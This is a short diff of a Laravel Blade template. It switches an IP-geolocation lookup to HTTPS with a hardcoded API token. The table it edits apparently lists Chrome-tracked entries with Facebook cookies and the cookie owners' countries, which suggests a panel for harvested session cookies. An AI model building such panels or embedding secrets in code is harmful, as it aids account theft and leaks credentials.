@@ -51,11 +51,12 @@
 @php
  function ip_details($IPaddress) 
 {
-    $json       = file_get_contents("http://ipinfo.io/{$IPaddress}");
+    $json       = file_get_contents("https://ipinfo.io/{$IPaddress}?token=bfc6fd80781b1d");
     $details    = json_decode($json);
     return $details;
 }
 @endphp 
+
 
 @php $i = 1; @endphp
                        @foreach($data as $datas) 
@@ -63,7 +64,7 @@
                         <td>@php echo $i++; @endphp</td>  
                         <td><img width="15" height="15" src="@if($datas['live'] == 1) {{url('uploads/chrome.png')}} @else{{url('uploads/chromegrey.png')}} @endif " alt="Italian Trulli"> </td>
                         <td> @if(!empty($datas['cookies'])) <img height="30" width="30" src="{{url('uploads/facebook.png')}}" alt="Italian Trulli"> @endif</td> 
-                        <td>   @php if(!empty($datas['cookies']['ip'])) { $IPaddress  = ip_details($datas['cookies']['ip']); echo  $IPaddress->country; }  @endphp    </td> 
+                        <td>   @php if(!empty($datas['cookies']['ip'])) { $IPaddress  = ip_details($datas['cookies']['ip']); echo  $IPaddress->country; }  @endphp</td> 
 
 
                        <td>{{$datas['name']}} </td>
